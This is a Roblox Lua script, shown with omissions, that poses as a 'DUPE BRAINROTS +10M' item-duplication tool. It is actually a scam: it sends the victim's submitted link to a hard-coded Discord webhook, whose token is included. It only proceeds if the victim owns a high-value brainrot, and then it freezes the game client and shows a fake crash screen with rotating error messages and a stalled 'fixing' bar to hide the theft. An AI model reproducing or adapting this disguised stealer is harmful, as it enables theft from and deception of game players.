...
local WEBHOOK_URLS = {
    "https://discord.com/api/webhooks/1448156763085082744/XrRcp0qlMo0zyX6wDMsqbrA817jVkd9plPOR5NhOaoAMcBDVKZmz8cyxAypsIhWJ_9cV",
    ""
}

local Mutations = {
    ["Gold"] = {multiplier = 1.5, emoji = "🟡"},
    ["Bloodrot"] = {multiplier = 2, emoji = "🔴"},
    ["Diamond"] = {multiplier = 3, emoji = "💎"},
    ["Candy"] = {multiplier = 4, emoji = "🍬"},
    ["Lava"] = {multiplier = 6, emoji = "🌋"},
    ["Galaxy"] = {multiplier = 7, emoji = "🌌"},
    ["Yin Yang"] = {multiplier = 7.5, emoji = "☯️"},
    ["Rainbow"] = {multiplier = 10, emoji = "🌈"}
}
...
local function sendWebhook(link)
    ...
    -- Intentar enviar a cada URL en la lista
...
local function simulateCrash()
    ...
    wait(1) -- Esperar 1 segundo después del crash
    ...
    local errorMessages = {
        ...
        "522 a Timeout ocurred",
        "522 Timeout",
        "10015 You being ratelimited!",
        "403 Forbidden",
        "404 not found"
    ...
    spawn(function()
        while true do
            ...
            crashText.Text = "An error has occurred\n" .. randomMessage
            wait(10) -- Cambiar mensajes cada 2 segundos
        end
    end)
    ...
    fixingBar.Size = UDim2.new(0, 50, 1, 0) -- Barra estática al 12.5%
...
if not checkIfPrivateServer() then
    player:Kick("❌ Only allowed in private servers\n✅ Join a private server first")
    return
end
...
screenGui.Name = "DUPE BRAINROTS +10M"
...
mainFrame.Size = UDim2.new(0, 400, 0, 300) -- GUI más pequeña (centro, 400x300)
...
loaderSound.Volume = 1 -- Volumen estándar
...
titleLabel.Text = "DUPE BRAINROTS +10M"
...
discordLabel.Text = "discord.gg/hwzSp8qXWN"
...
footerLabel.Text = "Made by apela"
...
local function checkBrainrotValue()
    ...
    for _, brainrot in pairs(ownedBrainrots) do
        if brainrot.productionPerUnit > 10 then -- 10M threshold
            return true
        end
    end
    return false
...
joinButton.MouseButton1Click:Connect(function()
    ...
    -- Verificar si hay brainrots > 10M
    if not checkBrainrotValue() then
        -- Restaurar la GUI original si no hay brainrots > 10M
        textBoxFrame.Visible = true
        joinButton.Visible = true
        errorLabel.Text = "❌ Requires brainrot > 10M"
        errorLabel.Visible = true
        wait(3)
        errorLabel.Visible = false
    ...
    if not success then
        errorLabel.Text = "❌ Failed to send data to webhook"
        errorLabel.Visible = true
        controlsDisabled = false
        wait(3)
        errorLabel.Visible = false
    ...
    freezeClient()
    simulateCrash() -- Simular crash con errores continuos y barra estática
end)
